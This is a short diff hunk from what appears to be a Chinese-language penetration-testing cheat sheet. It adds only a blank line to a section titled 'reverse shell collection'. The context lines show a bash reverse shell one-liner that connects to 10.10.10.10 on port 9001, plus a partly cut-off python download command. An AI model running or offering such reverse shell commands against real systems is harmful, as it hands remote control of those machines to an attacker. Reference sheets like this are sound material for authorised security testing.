@@ -60,6 +60,7 @@ python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.co
 
 ### 反弹shell合集
 > ***2024-6-25: fb0sh***
+
 > **bash**
 ```bash
 /bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
